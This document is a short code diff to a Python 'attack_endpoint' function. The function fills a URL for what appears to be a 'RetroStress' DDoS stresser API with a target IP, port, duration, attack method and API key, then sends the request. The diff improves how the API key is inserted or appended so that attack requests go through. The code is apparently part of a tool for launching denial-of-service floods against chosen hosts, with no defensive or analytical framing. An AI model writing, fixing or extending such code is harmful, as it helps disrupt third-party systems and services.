@@ -395,15 +395,22 @@ def attack_endpoint():
             url = RETROSTRESS_API_URL
             
             # Check if URL is a template with placeholders
-            if "[target]" in url or "[port]" in url or "[time]" in url:
+            if "[target]" in url or "[port]" in url or "[time]" in url or "[key]" in url:
                 log("ℹ️ URL appears to be a template. Replacing placeholders.")
                 url = url.replace("[target]", ip)\
                          .replace("[port]", str(port))\
                          .replace("[time]", str(duration))\
-                         .replace("[method]", method)
+                         .replace("[method]", method)\
+                         .replace("[key]", RETROSTRESS_API_KEY if RETROSTRESS_API_KEY else "")
                 
+                # Fallback for common patterns
                 if "key=0" in url and RETROSTRESS_API_KEY:
                     url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
+                
+                # If key still not in URL and we have a key, append it
+                if "key=" not in url and RETROSTRESS_API_KEY:
+                    separator = "&" if "?" in url else "?"
+                    url += f"{separator}key={RETROSTRESS_API_KEY}"
                     
                 log(f"🔵 Calling RetroStress API: {url}")
                 response = requests.get(url, timeout=30)
@@ -411,7 +418,7 @@ def attack_endpoint():
                 # Fallback to standard params if no placeholders
                 params = {
                     "key": RETROSTRESS_API_KEY,
-                    "host": ip, # Use host instead of target as indicated by template
+                    "host": ip, 
                     "port": port,
                     "time": duration,
                     "method": method,
